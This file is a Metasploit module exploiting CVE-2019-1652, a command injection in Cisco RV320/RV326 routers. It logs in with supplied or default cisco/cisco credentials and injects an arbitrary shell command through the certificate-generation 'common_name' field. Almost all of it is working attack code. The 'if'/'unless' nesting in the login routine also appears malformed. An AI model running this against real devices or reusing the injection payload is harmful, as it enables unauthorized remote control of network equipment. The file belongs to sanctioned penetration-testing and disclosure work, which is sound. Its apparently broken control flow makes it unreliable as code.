##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco RV320/RV326 Blind Remote Code Execution',
      'Description'    => %q{
          The router's web interface enables users to generate new X.509
          certificates directly on the device. A user may enter typical
          configuration parameters required for the certificate, such as
          organisation, the common name and so on. In order to generate the
          certificate, the device uses the command-line program openssl [2]. The
          device's firmware uses a format string and does not perform input
          filtering, escaping or encoding happening on the server. This allows
          attackers to inject arbitrary commands.
        },
      'Author'         =>
        [
          'David Davidson (0x27) <@info_dox>',
          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>',
          'Aaron Soto <asoto@rapid7.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '46243'],
          ['BID', '106728'],
          ['CVE', '2019-1652'],
          ['URL', 'https://github.com/0x27/CiscoRV320Dump'],
          ['URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection'],
          ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvm78058'],
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject']
        ],
      'DisclosureDate' => 'Jan 23 2019',
      'DefaultOptions' =>
        {
          'SSL'   => true
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),
        OptString.new('USERNAME',  [true, 'Web UI username for the device', 'cisco']),
        OptString.new('PASSWORD',  [true, 'Web UI password for the device', 'cisco']),
        OptString.new('COMMAND',   [true, 'Command to be executed', nil])
      ])
  end

  def run
    login(datastore['USERNAME'], datastore['PASSWORD'])
    exec(datastore['COMMAND'])
  end

  def login(username, password)
    # Generate the authentication keys and hashes (falling back to default values when possible)
    auth_key      = extract_auth_key ||= "1964300002"
    password_hash = Digest::MD5.hexdigest(password + auth_key)
    password_b64  = Rex::Text.encode_base64(password)

    vprint_status("auth_key      = #{auth_key}")
    vprint_status("password_hash = #{password_hash}")
    vprint_status("password_b64  = #{password_b64}")

    post_data = generate_login_post_data(auth_key, password_b64, password_hash, username)
    r = request_uri('POST', '/cgi-bin/userLogin.cgi', post_data)

    # Check for failures
    if r.include? "URL=/cgi-bin/welcome.cgi/CommonPortal?err=Login_Fail"
      fail_with(Failure::UnexpectedReply, "Invalid credentials.  Login failed.")
    unless r.include? "URL=/default.htm"
      fail_with(Failure::UnexpectedReply, "Unexpected response.  Failed to login.")
    end

    vprint_status("Logged in successfully.")
  end

  def exec(command)
    post_data = generate_exec_post_data(command)
    r = request_uri('POST', '/certificate_handle2.htm?type=4', post_data)

    #TODO: Can we detect if it worked?  (Spoiler: probably not.)  (Edit: Probably not easily.)
  end

  def extract_auth_key
    body = request_uri('GET', '/')
    auth_key = body.match(/"auth_key" value="(.*?)">/)[1]
  end

  def generate_login_post_data(auth_key, password_b64, password_hash, username)
    post_data = {"auth_key": auth_key,
                 "auth_server_pw": password_b64,
                 "changelanguage": "",
                 "current_password": "",
                 "langName": "ENGLISH,Deutsch,Espanol,Francais,Italiano",
                 "LanguageList": "ENGLISH",
                 "login": "true",
                 "md5_old_pass": "",
                 "new_password": "",
                 "password": password_hash,
                 "password_expired": 0,
                 "pdStrength": 0,
                 "portalname": "CommonPortal",
                 "re_new_password": "",
                 "submitStatus": 0,
                 "username": username }
  end

  def generate_exec_post_data(command)
    post_data = {"page": "self_generator.htm",
                 "totalRules": 1,
                 "OpenVPNRules": 30,
                 "submitStatus": 1,
                 "log_ch": 1,
                 "type": 4,
                 "Country": "A",
                 "state": "A",
                 "locality": "A",
                 "organization": "A",
                 "organization_unit": "A",
                 "email": "ab%40example.com",
                 "KeySize": 512,
                 "KeyLength": 1024,
                 "valid_days": 30,
                 "SelectSubject_c": 1,
                 "SelectSubject_s": 1,
                 "common_name": "a'$(#{command})'b" }
  end

  def request_uri(method, path, data=nil)
    begin
      opts = {
        'uri'           => path,
        'method'        => method,
        'headers'       => { 'Connection' => 'keep-alive',
                             'Cookie'     => @cookies },
        'vars_post'     => data
      }

      res = send_request_cgi(
        opts = opts,
        timeout = 60,
        disconnect = false
      )
    rescue OpenSSL::SSL::SSLError
      fail_with(Failure::UnexpectedReply, "SSL handshake failed.  Consider setting 'SSL' to 'false' and trying again.")
    end

    if res.nil?
      fail_with(Failure::UnexpectedReply, "Empty response.  Please validate the RHOST and TARGETURI options.")
    elsif res.code != 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options.")
    else
      @cookies = res.get_cookies
      return res.body
    end
  end
end
